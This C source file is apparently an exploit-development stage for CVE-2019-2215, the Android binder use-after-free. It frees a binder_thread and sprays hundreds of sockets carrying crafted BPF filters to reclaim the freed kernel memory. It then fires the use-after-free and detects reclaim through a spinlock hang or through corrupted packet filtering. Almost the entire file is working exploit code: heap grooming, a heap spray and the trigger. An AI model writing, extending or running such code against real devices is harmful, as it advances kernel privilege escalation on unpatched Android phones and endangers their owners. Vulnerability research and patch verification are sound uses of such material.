/*
 * bpf_mass_spray.c — Massive BPF spray to force reclaim of freed binder_thread
 *
 * Previous tests used only 1 BPF socket for reclaim. The freed binder_thread
 * might be buried deep in the SLUB freelist. Spray 500 BPF sockets to cover
 * hundreds of positions in the freelist.
 *
 * Detection via hang: LD_IMM at insns[4] (offset 44) has internal code 30.
 * As spinlock: owner=30, next=0 → LOCKED → spin_lock hangs → SIGALRM.
 *
 * Also tries: spinlock-compatible + packet filter detection.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/epoll.h>
#include <sys/wait.h>
#include <arpa/inet.h>
#include <linux/filter.h>

#define BINDER_THREAD_EXIT  0x40046208
#define BINDER_SET_MAX_THREADS 0x40046205

/* TEST A: Hang detection — LD_IMM at spinlock offset causes hang */
static int test_hang(int spray_count, int groom_count) {
    cpu_set_t cs;
    CPU_ZERO(&cs);
    CPU_SET(0, &cs);
    sched_setaffinity(0, sizeof(cs), &cs);
    
    /* Optional grooming with binder threads */
    int groom_bfd[300], groom_epfd[300];
    int actual_groom = 0;
    for (int i = 0; i < groom_count && i < 300; i++) {
        groom_bfd[i] = open("/dev/binder", O_RDWR | O_CLOEXEC);
        if (groom_bfd[i] < 0) break;
        uint32_t mx = 0;
        ioctl(groom_bfd[i], BINDER_SET_MAX_THREADS, &mx);
        groom_epfd[i] = epoll_create1(O_CLOEXEC);
        struct epoll_event ev = { .events = EPOLLIN };
        epoll_ctl(groom_epfd[i], EPOLL_CTL_ADD, groom_bfd[i], &ev);
        actual_groom = i + 1;
    }
    for (int i = actual_groom - 1; i >= 0; i--) {
        int thr = 0;
        ioctl(groom_bfd[i], BINDER_THREAD_EXIT, &thr);
        close(groom_epfd[i]);
    }
    
    /* Target binder_thread */
    int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    if (bfd < 0) { for(int i=0;i<actual_groom;i++) close(groom_bfd[i]); return -1; }
    uint32_t mx = 0;
    ioctl(bfd, BINDER_SET_MAX_THREADS, &mx);
    int epfd = epoll_create1(O_CLOEXEC);
    struct epoll_event ev = { .events = EPOLLIN };
    epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);
    
    /* Free target */
    int thr = 0;
    ioctl(bfd, BINDER_THREAD_EXIT, &thr);
    
    /* MASSIVE BPF spray — all LD_IMM (spinlock-incompatible at insns[4])
     * Internal code for LD_IMM = 30. At offset 44: owner=30, next=0 → LOCKED.
     * If any spray socket reclaims the freed slot, close(epfd) hangs. */
    int *spray_fds = malloc(spray_count * sizeof(int));
    struct sock_filter spray_insns[20];
    memset(spray_insns, 0, sizeof(spray_insns));
    for (int j = 0; j < 19; j++) {
        spray_insns[j].code = 0x00; /* LD_IMM */
        spray_insns[j].k = 0xDEAD0000 + j;
    }
    spray_insns[19].code = 0x06; /* RET ACCEPT */
    spray_insns[19].k = 0xFFFF;
    struct sock_fprog prog = { .len = 20, .filter = spray_insns };
    
    int created = 0;
    for (int i = 0; i < spray_count; i++) {
        spray_fds[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if (spray_fds[i] < 0) break;
        if (setsockopt(spray_fds[i], SOL_SOCKET, SO_ATTACH_FILTER,
                      &prog, sizeof(prog)) < 0) {
            close(spray_fds[i]);
            spray_fds[i] = -1;
            break;
        }
        created++;
    }
    
    /* UAF trigger — if any spray reclaimed, this hangs */
    close(epfd);
    
    /* If we get here, no reclaim (or spinlock was compatible) */
    for (int i = 0; i < created; i++) close(spray_fds[i]);
    free(spray_fds);
    close(bfd);
    for (int i = 0; i < actual_groom; i++) close(groom_bfd[i]);
    return 0; /* completed = no reclaim detected */
}

/* TEST B: Packet filter detection with spray */
static int test_filter(int spray_count) {
    cpu_set_t cs;
    CPU_ZERO(&cs);
    CPU_SET(0, &cs);
    sched_setaffinity(0, sizeof(cs), &cs);
    
    /* Target binder_thread */
    int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    if (bfd < 0) return -1;
    uint32_t mx = 0;
    ioctl(bfd, BINDER_SET_MAX_THREADS, &mx);
    int epfd = epoll_create1(O_CLOEXEC);
    struct epoll_event ev = { .events = EPOLLIN };
    epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);
    
    int thr = 0;
    ioctl(bfd, BINDER_THREAD_EXIT, &thr);
    
    /* Spray with spinlock-compatible RET_K at insns[4] */
    int *spray_fds = malloc(spray_count * sizeof(int));
    struct sockaddr_in *addrs = malloc(spray_count * sizeof(struct sockaddr_in));
    struct sock_filter det_insns[20];
    memset(det_insns, 0, sizeof(det_insns));
    for (int j = 0; j < 4; j++) {
        det_insns[j].code = 0x00; /* LD_IMM */
        det_insns[j].k = 42;
    }
    det_insns[4].code = 0x06; /* RET_K → internal 1 */
    det_insns[4].jt = 1; det_insns[4].jf = 0; det_insns[4].k = 0; /* DROP, unlocked */
    for (int j = 5; j < 19; j++) {
        det_insns[j].code = 0x06; det_insns[j].k = 0;
    }
    det_insns[19].code = 0x06; det_insns[19].k = 0xFFFF;
    struct sock_fprog prog = { .len = 20, .filter = det_insns };
    
    int created = 0;
    for (int i = 0; i < spray_count; i++) {
        spray_fds[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if (spray_fds[i] < 0) break;
        
        memset(&addrs[i], 0, sizeof(addrs[i]));
        addrs[i].sin_family = AF_INET;
        addrs[i].sin_addr.s_addr = htonl(0x7F000001);
        addrs[i].sin_port = htons(30000 + i);
        if (bind(spray_fds[i], (struct sockaddr*)&addrs[i], sizeof(addrs[i])) < 0) {
            close(spray_fds[i]);
            spray_fds[i] = -1;
            break;
        }
        
        struct timeval tv = { .tv_sec = 0, .tv_usec = 10000 }; /* 10ms */
        setsockopt(spray_fds[i], SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        setsockopt(spray_fds[i], SOL_SOCKET, SO_ATTACH_FILTER, &prog, sizeof(prog));
        created++;
    }
    
    /* UAF trigger */
    close(epfd);
    
    /* Check ALL sockets for corruption */
    int sender = socket(AF_INET, SOCK_DGRAM, 0);
    int detected = 0;
    for (int i = 0; i < created; i++) {
        char msg[] = "UAF";
        sendto(sender, msg, sizeof(msg), 0, (struct sockaddr*)&addrs[i], sizeof(addrs[i]));
        char buf[32];
        ssize_t got = recv(spray_fds[i], buf, sizeof(buf), 0);
        if (got > 0) detected++;
    }
    
    close(sender);
    for (int i = 0; i < created; i++) if (spray_fds[i] >= 0) close(spray_fds[i]);
    free(spray_fds);
    free(addrs);
    close(bfd);
    
    return detected;
}

int main() {
    printf("=== CVE-2019-2215 Mass BPF Spray ===\n\n");
    
    /* TEST A: Hang detection with various spray sizes */
    printf("--- TEST A: Hang detection (LD_IMM at spinlock) ---\n");
    int spray_sizes[] = {50, 200, 500};
    int groom_sizes[] = {0, 100};
    
    for (int g = 0; g < 2; g++) {
        for (int s = 0; s < 3; s++) {
            int spray = spray_sizes[s];
            int groom = groom_sizes[g];
            int hangs = 0, ok = 0, err = 0;
            int attempts = 50;
            
            for (int i = 0; i < attempts; i++) {
                pid_t pid = fork();
                if (pid == 0) {
                    alarm(5);
                    int r = test_hang(spray, groom);
                    _exit(r < 0 ? 2 : (r == 0 ? 0 : 1));
                }
                int status;
                waitpid(pid, &status, 0);
                if (WIFSIGNALED(status) && WTERMSIG(status) == 14) {
                    hangs++;
                    if (hangs <= 2) printf("  [spray=%d,groom=%d] HANG! Reclaim confirmed!\n", spray, groom);
                } else if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
                    ok++;
                } else {
                    err++;
                }
            }
            printf("  spray=%3d groom=%3d: %d hangs, %d ok, %d err / %d\n",
                   spray, groom, hangs, ok, err, attempts);
        }
    }
    
    /* TEST B: Packet filter detection with spray */
    printf("\n--- TEST B: Filter corruption detection (spray + per-socket check) ---\n");
    for (int spray = 100; spray <= 500; spray += 200) {
        int total_detected = 0;
        int attempts = 20;
        
        for (int i = 0; i < attempts; i++) {
            pid_t pid = fork();
            if (pid == 0) {
                alarm(10);
                int d = test_filter(spray);
                _exit(d > 0 ? d : 0);
            }
            int status;
            waitpid(pid, &status, 0);
            if (WIFEXITED(status)) {
                int d = WEXITSTATUS(status);
                if (d > 0) {
                    total_detected++;
                    printf("  [spray=%d,attempt=%d] %d sockets corrupted!\n", spray, i, d);
                }
            }
        }
        printf("  spray=%d: %d/%d attempts had corruption\n", spray, total_detected, attempts);
    }
    
    printf("\n=== Done ===\n");
    return 0;
}
